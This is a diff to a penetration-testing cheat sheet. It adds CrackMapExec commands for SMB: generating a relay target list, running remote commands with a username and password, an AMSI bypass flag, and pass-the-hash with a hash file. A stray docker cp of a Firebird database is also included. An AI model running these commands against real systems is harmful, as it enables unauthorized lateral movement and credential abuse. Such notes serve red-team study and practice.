@@ -1506,12 +1506,18 @@ $ Ctrl + z @ stty -raw echo;fg
 ### Crackmapexec
 
 ```code
-# Docker install
-docker pull byt3bl33d3r/crackmapexec
-docker run -it --entrypoint=/bin/sh --name crackmapexec byt3bl33d3r/crackmapexec
-docker start crackmapexec
-docker exec -it crackmapexec sh
-docker cp /var/lib/docker/volumes/data/_data/EMPLOYEE.FDB firebird:/firebird/data/EMPLOYEE2.FDB
+=> Docker install
+$ docker pull byt3bl33d3r/crackmapexec
+$ docker run -it --entrypoint=/bin/sh --name crackmapexec byt3bl33d3r/crackmapexec
+$ docker start crackmapexec
+$ docker exec -it crackmapexec sh
+$ docker cp /var/lib/docker/volumes/data/_data/EMPLOYEE.FDB firebird:/firebird/data/EMPLOYEE2.FDB
+
+=> Commands
+$ crackmapexec smb --gen-relay-list targets.txt 10.10.10.0/24
+$ crackmapexec smb 10.10.10.10 -u 'nik' -p 'Password@123!' -X whoami --amsi-bypass /tmp/amsiibypass
+$ crackmapexec smb 10.10.10.10 -u 'nik' -p 'Password@123!' -x whoami 
+$ crackmapexec smb 10.10.10.10 -u 'nik' -H hash_uniq.txt
 ```
 
 ### Impacket Tools
